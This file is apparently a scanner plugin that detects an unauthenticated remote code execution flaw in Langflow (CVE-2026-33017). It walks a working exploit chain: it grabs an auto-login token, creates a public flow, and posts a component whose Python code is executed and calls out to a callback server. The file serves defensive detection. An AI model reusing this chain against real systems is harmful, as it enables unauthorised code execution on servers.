@@ -1,0 +1,164 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "Langflow_CVE_2026_33017"
+  author: "sanjaymahajan14"
+  version: "1.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "GOOGLE"
+    value: "CVE-2026-33017"
+  }
+  severity: CRITICAL
+  title: "Langflow < 1.9.0 - Unauthenticated Remote Code Execution in build_public_tmp Endpoint"
+  description: "Langflow versions prior to 1.9.0 allow unauthenticated remote code execution via the POST /api/v1/build_public_tmp/{flow_id}/flow endpoint. Note that versions 1.8.2 through 1.8.4 remain vulnerable despite initial fix claims. The endpoint accepts attacker-controlled flow definitions through the data parameter, which contains custom Python components that are executed server-side via exec() without sandboxing, allowing remote unauthenticated attackers to execute arbitrary system commands."
+  recommendation: "Upgrade Langflow to version 1.9.0 or later, and restrict network access to Langflow instances."
+
+  related_id: {
+    publisher: "CVE"
+    value: "CVE-2026-33017"
+  }
+}
+
+config: {}
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "fingerprint_langflow"
+  http_request: {
+    method: GET
+    uri: "/"
+    response: {
+      http_status: 200
+      expect_any: {
+        conditions: [
+          { body: {} contains: "<title>Langflow" },
+          { body: {} contains: "Langflow" }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "get_auto_login_token"
+  http_request: {
+    method: GET
+    uri: "/api/v1/auto_login"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { body: {} contains: "\"access_token\":" }
+        ]
+      }
+      extract_all: {
+        patterns: [
+          {
+            from_body: {}
+            regexp: "\"access_token\":\"([^\"]+)\""
+            variable_name: "token"
+          }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "create_public_flow"
+  http_request: {
+    method: POST
+    uri: "/api/v1/flows/"
+    headers: [
+      { name: "Authorization" value: "Bearer {{ token }}" },
+      { name: "Content-Type" value: "application/json" }
+    ]
+    data: "{\"name\":\"tsunami_cve_2026_33017\",\"access_type\":\"PUBLIC\",\"data\":{\"nodes\":[],\"edges\":[]}}"
+    response: {
+      http_status: 201
+      expect_all: {
+        conditions: [
+          { body: {} contains: "\"id\":" }
+        ]
+      }
+      extract_all: {
+        patterns: [
+          {
+            from_body: {}
+            regexp: "\"id\":\"([0-9a-fA-F-]+)\""
+            variable_name: "flow_id"
+          }
+        ]
+      }
+    }
+  }
+  cleanup_actions: ["delete_public_flow"]
+}
+
+actions: {
+  name: "trigger_rce_oob"
+  http_request: {
+    method: POST
+    uri: "/api/v1/build_public_tmp/{{ flow_id }}/flow"
+    headers: [
+      { name: "Content-Type" value: "application/json" },
+      { name: "Cookie" value: "client_id=tsunami-scanner" }
+    ]
+    data: "{\"inputs\":null,\"data\":{\"nodes\":[{\"id\":\"tsunami_node\",\"type\":\"genericNode\",\"data\":{\"id\":\"tsunami_node\",\"type\":\"ExploitComp\",\"node\":{\"display_name\":\"ExploitComp\",\"outputs\":[],\"template\":{\"code\":{\"type\":\"code\",\"value\":\"_x = __import__('urllib.request').request.urlopen('{{ T_CBS_URI }}')\\n\\nfrom lfx.custom.custom_component.component import Component\\nclass ExploitComp(Component):\\n    pass\"},\"_type\":\"Component\"},\"name\":\"ExploitComp\",\"base_classes\":[\"Component\"]}}}],\"edges\":[]}}"
+    client_options: {
+      ignore_http_client_errors: true
+    }
+  }
+}
+
+actions: {
+  name: "sleep"
+  utility: { sleep: { duration_ms: 2000 } }
+}
+
+actions: {
+  name: "check_callback_server_logs"
+  callback_server: { action_type: CHECK }
+}
+
+actions: {
+  name: "delete_public_flow"
+  http_request: {
+    method: DELETE
+    uri: "/api/v1/flows/{{ flow_id }}"
+    headers: [
+      { name: "Authorization" value: "Bearer {{ token }}" }
+    ]
+    client_options: {
+      ignore_http_client_errors: true
+    }
+  }
+}
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  condition: REQUIRES_CALLBACK_SERVER
+  actions: [
+    "fingerprint_langflow",
+    "get_auto_login_token",
+    "create_public_flow",
+    "trigger_rce_oob",
+    "sleep",
+    "check_callback_server_logs"
+  ]
+}
